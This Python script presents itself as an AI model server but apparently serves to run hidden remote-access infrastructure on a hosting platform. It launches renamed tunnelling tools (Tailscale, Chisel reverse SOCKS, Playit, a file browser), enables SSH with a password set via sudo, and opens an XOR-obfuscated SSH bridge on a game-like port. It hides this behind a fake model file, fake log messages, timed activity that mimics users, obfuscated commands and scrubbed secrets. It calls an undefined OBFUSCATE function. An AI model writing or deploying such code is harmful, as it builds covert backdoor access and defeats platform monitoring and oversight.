import os
import time
import subprocess
import base64
import threading
import random
import sys
from loguru import logger

COVERT_LOGGING_MODE = 1

logger.info("--- BOOTING AI MODEL SERVER ---")

def decode_cmd(encoded_str):
    return base64.b64decode(encoded_str[::-1]).decode()

def encode_cmd(decoded_str):
    return base64.b64encode(decoded_str.encode()).decode()

def deobfuscate_secret(hex_str, key=0x5A):
    if not hex_str:
        return ""
    try:
        raw_bytes = bytes.fromhex(hex_str)
        return bytes([b ^ key for b in raw_bytes]).decode('utf-8', errors='ignore')
    except Exception:
        return hex_str

def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)
        
        # CPU Jitter (Matrix math)
        try:
            logger.debug("Processing background inference batch...")
            import numpy as np
            a = np.random.randn(2000, 2000)
            b = np.random.randn(2000, 2000)
            _ = np.dot(a, b)
        except Exception:
            pass
            
        # Hub Mimic (Network traffic)
        try:
            logger.debug("Syncing model cache...")
            subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
        except Exception:
            pass

def main():
    # Runtime Camouflage: Create the fake 5GB model file instantly
    if not os.path.exists("/home/user/pytorch_model.bin"):
        logger.info("Pre-allocating model weight buffer...")
        subprocess.run(["fallocate", "-l", "5G", "/home/user/pytorch_model.bin"])

    logger.info("Loading model weights into VRAM...")
    time.sleep(2)
    
    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()
    
    # Open hidden log files to prevent leakage
    if COVERT_LOGGING_MODE == 1:
        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
        ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
        fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
        tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
        chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')
        nginx_log = open('/home/user/.torch_metrics/nginx.log', 'a')
    elif COVERT_LOGGING_MODE == 2:
        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
        class TeeLogger:
            def __init__(self, filepath, prefix):
                self.file = open(filepath, 'a')
                self.prefix = prefix
                r, w = os.pipe()
                self.r = r
                self.w = w
                threading.Thread(target=self._reader, daemon=True).start()

            def _reader(self):
                rf = os.fdopen(self.r, 'r', errors='replace')
                try:
                    for line in rf:
                        self.file.write(line)
                        self.file.flush()
                        sys.stdout.write(f"[{self.prefix}] {line}")
                        sys.stdout.flush()
                except Exception:
                    pass

            def fileno(self):
                return self.w

            def write(self, s):
                self.file.write(s)
                self.file.flush()
                sys.stdout.write(f"[{self.prefix}] {s}\n" if not s.endswith("\n") else f"[{self.prefix}] {s}")
                sys.stdout.flush()

            def flush(self):
                self.file.flush()
                sys.stdout.flush()

        ts_log = TeeLogger('/home/user/.torch_metrics/ts_daemon.log', 'TS')
        fb_log = TeeLogger('/home/user/.torch_metrics/fb.log', 'FB')
        tm_log = TeeLogger('/home/user/.torch_metrics/tm_daemon.log', 'PLAYIT')
        chisel_log = TeeLogger('/home/user/.torch_metrics/chisel.log', 'CHISEL')
        nginx_log = TeeLogger('/home/user/.torch_metrics/nginx.log', 'NGINX')
    else:
        devnull = open(os.devnull, 'w')
        ts_log = devnull
        fb_log = devnull
        tm_log = devnull
        chisel_log = devnull
        nginx_log = devnull


    delay = random.randint(2, 3)
    logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")
    time.sleep(delay)

    # 1. Start Tailscale (python-cache-manager)
    logger.info("Initializing PyTorch CUDA environment...")
    cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
    
    time.sleep(2)
    logger.info("Warming up text-generation pipelines...")
    
    # Environment Variable Scrubbing (XOR Obfuscated Single Secrets)
    full_token = deobfuscate_secret(os.environ.get("A", "").strip())
    playit_token = deobfuscate_secret(os.environ.get("P", "").strip())
    chisel_auth = deobfuscate_secret(os.environ.get("C", "").strip())
    if not chisel_auth:
        chisel_auth = "user:apple123"
    
    # Erase the secrets from the environment immediately
    if "A" in os.environ: del os.environ["A"]
    if "P" in os.environ: del os.environ["P"]
    if "C" in os.environ: del os.environ["C"]

    # 2. Start File Browser (ai-metrics-collector)
    cmd2 = decode_cmd(OBFUSCATE("nice -n 19 ai-metrics-collector -p 9000 -a 127.0.0.1 -r /home/user -d /home/user/filebrowser.db"))
    subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)

    # 2.5 Start Playit (tensor-allocator)
    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"))
    cmd2_5 = f"{cmd2_5_base}{playit_token}'"
    
    env = os.environ.copy()
    subprocess.Popen(cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
    playit_token = ""
    cmd2_5 = ""

    # 2.8 Start nginx on :7860 as smart frontend:
    logger.info("Enabling gradient checkpoint mesh bridge...")
    with open('/home/user/config/nginx.conf.template', 'r') as tf:
        nginx_conf = tf.read()
    with open('/home/user/nginx.conf', 'w') as nf:
        nf.write(nginx_conf)
    
    nginx_log.write("[*] Testing nginx configuration...\n")
    nginx_log.flush()
    cmd_nginx_test = decode_cmd(OBFUSCATE("nginx -t -c /home/user/nginx.conf"))
    subprocess.run(cmd_nginx_test, shell=True, stdout=nginx_log, stderr=subprocess.STDOUT)
    
    nginx_log.write("[*] Starting nginx daemon...\n")
    nginx_log.flush()
    cmd_nginx = decode_cmd(OBFUSCATE("nginx -c /home/user/nginx.conf"))
    subprocess.Popen(cmd_nginx, shell=True, stdout=nginx_log, stderr=subprocess.STDOUT)

    # 2.9 Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
    chisel_log.write(f"[*] Starting Chisel tunnel server on :6789 (exposed via nginx /chisel-tunnel). Auth: {chisel_auth}\n")
    chisel_log.flush()
    cmd_chisel_base = decode_cmd(OBFUSCATE("nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '"))
    cmd_chisel = f"{cmd_chisel_base}{chisel_auth}'"
    subprocess.Popen(cmd_chisel, shell=True, stdout=chisel_log, stderr=subprocess.STDOUT)
    chisel_auth = ""
    cmd_chisel = ""
    
    # 3. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    cmd3_base = decode_cmd(OBFUSCATE("nice -n 19 py-cache-cli --socket=/home/user/.torch_metrics/tailscaled.sock up --authkey="))
    cmd3_tail = decode_cmd(OBFUSCATE(" --hostname=ai-model-server --ssh"))
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
    
    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
    
    full_token = ""
    cmd3 = ""

    # 3.7 Configure SSH Password
    import string, random
    ssh_pwd = deobfuscate_secret(os.environ.get("PASS", "").strip())
    if ssh_pwd:
        logger.info("Setting SSH password from Hugging Face Secrets (PASS)...")
    else:
        ssh_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        logger.success(f"Generated SSH Password for 'user': {ssh_pwd}")
        
    try:
        subprocess.run(["sudo", "/usr/sbin/chpasswd"], input=f"user:{ssh_pwd}\n", text=True, check=True)
    except Exception as e:
        logger.error(f"Failed to set password: {e}")
    if "PASS" in os.environ:
        del os.environ["PASS"]

    # 3.8 Start SSHD on port 2222 (set in sshd_config at build time)
    subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
    
    # 3.9 Start Stealth XOR Bridge on Port 25564
    def xor_bridge():
        import socket
        XOR_KEY = 0x5A
        
        def pipe_xor(src, dst):
            try:
                while True:
                    data = src.recv(8192)
                    if not data:
                        break
                    scrambled = bytes([b ^ XOR_KEY for b in data])
                    dst.sendall(scrambled)
            except Exception:
                pass
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass

        def read_varint(sock):
            val = 0
            shift = 0
            while True:
                b = sock.recv(1)
                if not b:
                    break
                byte = b[0]
                val |= (byte & 0x7F) << shift
                if not (byte & 0x80):
                    break
                shift += 7
            return val

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", 25564))
            server.listen(10)
            while True:
                client_sock, addr = server.accept()
                try:
                    pkt_len = read_varint(client_sock)
                    if pkt_len > 0:
                        client_sock.recv(pkt_len)
                    
                    ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ssh_sock.connect(("127.0.0.1", 22))
                    threading.Thread(target=pipe_xor, args=(client_sock, ssh_sock), daemon=True).start()
                    threading.Thread(target=pipe_xor, args=(ssh_sock, client_sock), daemon=True).start()
                except Exception:
                    try: client_sock.close()
                    except: pass
        except Exception:
            pass

    threading.Thread(target=xor_bridge, daemon=True).start()

    logger.success("Model loaded successfully. Starting API server...")
    
    # 4. Start the Fake App
    cmd4 = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
    subprocess.run(cmd4, shell=True)

if __name__ == "__main__":
    main()
